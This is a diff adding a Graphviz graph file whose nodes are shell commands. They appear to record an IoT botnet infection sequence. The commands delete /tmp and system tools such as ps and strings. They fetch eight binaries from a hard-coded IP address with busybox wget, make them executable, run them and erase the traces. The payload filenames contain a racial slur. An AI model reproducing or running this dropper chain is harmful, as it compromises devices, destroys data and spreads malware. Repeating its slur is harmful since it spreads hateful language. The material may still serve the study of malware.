@@ -1,0 +1,254 @@
+digraph {
+0 [label="ulimit -u 512 "];
+0 -> 0
+2 [label="ulimit -n 512 "];
+2 -> 2
+248 [label="rm -f * "];
+248 -> 248
+6 [label="busybox rm -rf /tmp/* "];
+6 -> 6
+8 [label="busybox rm -rf /usr/bin/strings "];
+8 -> 8
+10 [label="busybox rm -rf /usr/bin/ps "];
+10 -> 10
+92 [label="busybox wget http://185.103.109.204/nigger1 "];
+92 -> 92
+14 [label="busybox chmod +x nigger1 "];
+14 -> 106 [label=";,"];
+106 [label="./nigger1 "];
+106 -> 108 [label=";,"];
+108 [label="busybox rm -f nigger1* "];
+108 -> 248 [label=";,"];
+248 [label="rm -f * "];
+248 -> 248
+112 [label="busybox wget http://185.103.109.204/nigger2 "];
+112 -> 112
+24 [label="busybox chmod +x nigger2 "];
+24 -> 126 [label=";,"];
+126 [label="./nigger2 "];
+126 -> 128 [label=";,"];
+128 [label="busybox rm -f nigger2* "];
+128 -> 248 [label=";,"];
+248 [label="rm -f * "];
+248 -> 248
+132 [label="busybox wget http://185.103.109.204/nigger3 "];
+132 -> 132
+34 [label="busybox chmod +x nigger3 "];
+34 -> 146 [label=";,"];
+146 [label="./nigger3 "];
+146 -> 148 [label=";,"];
+148 [label="busybox rm -f nigger3* "];
+148 -> 248 [label=";,"];
+248 [label="rm -f * "];
+248 -> 248
+152 [label="busybox wget http://185.103.109.204/nigger4 "];
+152 -> 152
+44 [label="busybox chmod +x nigger4 "];
+44 -> 166 [label=";,"];
+166 [label="./nigger4 "];
+166 -> 168 [label=";,"];
+168 [label="busybox rm -f nigger4* "];
+168 -> 248 [label=";,"];
+248 [label="rm -f * "];
+248 -> 248
+172 [label="busybox wget http://185.103.109.204/nigger5 "];
+172 -> 172
+54 [label="busybox chmod +x nigger5 "];
+54 -> 186 [label=";,"];
+186 [label="./nigger5 "];
+186 -> 188 [label=";,"];
+188 [label="busybox rm -f nigger5* "];
+188 -> 248 [label=";,"];
+248 [label="rm -f * "];
+248 -> 248
+192 [label="busybox wget http://185.103.109.204/nigger6 "];
+192 -> 192
+64 [label="busybox chmod +x nigger6 "];
+64 -> 206 [label=";,"];
+206 [label="./nigger6 "];
+206 -> 208 [label=";,"];
+208 [label="busybox rm -f nigger6* "];
+208 -> 248 [label=";,"];
+248 [label="rm -f * "];
+248 -> 248
+212 [label="busybox wget http://185.103.109.204/nigger7 "];
+212 -> 212
+74 [label="busybox chmod +x nigger7 "];
+74 -> 226 [label=";,"];
+226 [label="./nigger7 "];
+226 -> 228 [label=";,"];
+228 [label="busybox rm -f nigger7* "];
+228 -> 248 [label=";,"];
+248 [label="rm -f * "];
+248 -> 248
+230 [label="busybox wget http://185.103.109.204/nigger8 "];
+230 -> 230
+84 [label="busybox chmod +x nigger8 "];
+84 -> 244 [label=";,"];
+244 [label="./nigger8 "];
+244 -> 246 [label=";,"];
+246 [label="busybox rm -f nigger8* "];
+246 -> 248 [label=";,"];
+248 [label="rm -f * "];
+248 -> 248
+92 [label="busybox wget http://185.103.109.204/nigger1 "];
+92 -> 92
+232 [label="busybox cp /bin/busybox ./ "];
+232 -> 96 [label=";,"];
+96 [label="busybox cat nigger1 busybox "];
+96 -> 236 [label=";,"];
+236 [label="busybox "];
+236 -> 236
+100 [label="busybox rm -f nigger1 "];
+100 -> 102 [label=";,"];
+102 [label="busybox cp busybox nigger1 "];
+102 -> 242 [label=";,"];
+242 [label="busybox rm -f busybox "];
+242 -> 106 [label=";,"];
+106 [label="./nigger1 "];
+106 -> 108 [label=";,"];
+108 [label="busybox rm -f nigger1* "];
+108 -> 248 [label=";,"];
+248 [label="rm -f * "];
+248 -> 248
+112 [label="busybox wget http://185.103.109.204/nigger2 "];
+112 -> 112
+232 [label="busybox cp /bin/busybox ./ "];
+232 -> 116 [label=";,"];
+116 [label="busybox cat nigger2 busybox "];
+116 -> 236 [label=";,"];
+236 [label="busybox "];
+236 -> 236
+120 [label="busybox rm -f nigger2 "];
+120 -> 122 [label=";,"];
+122 [label="busybox cp busybox nigger2 "];
+122 -> 242 [label=";,"];
+242 [label="busybox rm -f busybox "];
+242 -> 126 [label=";,"];
+126 [label="./nigger2 "];
+126 -> 128 [label=";,"];
+128 [label="busybox rm -f nigger2* "];
+128 -> 248 [label=";,"];
+248 [label="rm -f * "];
+248 -> 248
+132 [label="busybox wget http://185.103.109.204/nigger3 "];
+132 -> 132
+232 [label="busybox cp /bin/busybox ./ "];
+232 -> 136 [label=";,"];
+136 [label="busybox cat nigger3 busybox "];
+136 -> 236 [label=";,"];
+236 [label="busybox "];
+236 -> 236
+140 [label="busybox rm -f nigger3 "];
+140 -> 142 [label=";,"];
+142 [label="busybox cp busybox nigger3 "];
+142 -> 242 [label=";,"];
+242 [label="busybox rm -f busybox "];
+242 -> 146 [label=";,"];
+146 [label="./nigger3 "];
+146 -> 148 [label=";,"];
+148 [label="busybox rm -f nigger3* "];
+148 -> 248 [label=";,"];
+248 [label="rm -f * "];
+248 -> 248
+152 [label="busybox wget http://185.103.109.204/nigger4 "];
+152 -> 152
+232 [label="busybox cp /bin/busybox ./ "];
+232 -> 156 [label=";,"];
+156 [label="busybox cat nigger4 busybox "];
+156 -> 236 [label=";,"];
+236 [label="busybox "];
+236 -> 236
+160 [label="busybox rm -f nigger4 "];
+160 -> 162 [label=";,"];
+162 [label="busybox cp busybox nigger4 "];
+162 -> 242 [label=";,"];
+242 [label="busybox rm -f busybox "];
+242 -> 166 [label=";,"];
+166 [label="./nigger4 "];
+166 -> 168 [label=";,"];
+168 [label="busybox rm -f nigger4* "];
+168 -> 248 [label=";,"];
+248 [label="rm -f * "];
+248 -> 248
+172 [label="busybox wget http://185.103.109.204/nigger5 "];
+172 -> 172
+232 [label="busybox cp /bin/busybox ./ "];
+232 -> 176 [label=";,"];
+176 [label="busybox cat nigger5 busybox "];
+176 -> 236 [label=";,"];
+236 [label="busybox "];
+236 -> 236
+180 [label="busybox rm -f nigger5 "];
+180 -> 182 [label=";,"];
+182 [label="busybox cp busybox nigger5 "];
+182 -> 242 [label=";,"];
+242 [label="busybox rm -f busybox "];
+242 -> 186 [label=";,"];
+186 [label="./nigger5 "];
+186 -> 188 [label=";,"];
+188 [label="busybox rm -f nigger5* "];
+188 -> 248 [label=";,"];
+248 [label="rm -f * "];
+248 -> 248
+192 [label="busybox wget http://185.103.109.204/nigger6 "];
+192 -> 192
+232 [label="busybox cp /bin/busybox ./ "];
+232 -> 196 [label=";,"];
+196 [label="busybox cat nigger6 busybox "];
+196 -> 236 [label=";,"];
+236 [label="busybox "];
+236 -> 236
+200 [label="busybox rm -f nigger6 "];
+200 -> 202 [label=";,"];
+202 [label="busybox cp busybox nigger6 "];
+202 -> 242 [label=";,"];
+242 [label="busybox rm -f busybox "];
+242 -> 206 [label=";,"];
+206 [label="./nigger6 "];
+206 -> 208 [label=";,"];
+208 [label="busybox rm -f nigger6* "];
+208 -> 248 [label=";,"];
+248 [label="rm -f * "];
+248 -> 248
+212 [label="busybox wget http://185.103.109.204/nigger7 "];
+212 -> 212
+232 [label="busybox cp /bin/busybox ./ "];
+232 -> 216 [label=";,"];
+216 [label="busybox cat nigger7 busybox "];
+216 -> 236 [label=";,"];
+236 [label="busybox "];
+236 -> 236
+220 [label="busybox rm -f nigger7 "];
+220 -> 222 [label=";,"];
+222 [label="busybox cp busybox nigger7 "];
+222 -> 242 [label=";,"];
+242 [label="busybox rm -f busybox "];
+242 -> 226 [label=";,"];
+226 [label="./nigger7 "];
+226 -> 228 [label=";,"];
+228 [label="busybox rm -f nigger7* "];
+228 -> 230 [label=";,"];
+230 [label="busybox wget http://185.103.109.204/nigger8 "];
+230 -> 230
+232 [label="busybox cp /bin/busybox ./ "];
+232 -> 234 [label=";,"];
+234 [label="busybox cat nigger8 busybox "];
+234 -> 236 [label=";,"];
+236 [label="busybox "];
+236 -> 236
+238 [label="busybox rm -f nigger8 "];
+238 -> 240 [label=";,"];
+240 [label="busybox cp busybox nigger8 "];
+240 -> 242 [label=";,"];
+242 [label="busybox rm -f busybox "];
+242 -> 244 [label=";,"];
+244 [label="./nigger8 "];
+244 -> 246 [label=";,"];
+246 [label="busybox rm -f nigger8* "];
+246 -> 248 [label=";,"];
+248 [label="rm -f * "];
+248 -> 248
+250 [label="sleep 1 "];
+250 -> 250
+}
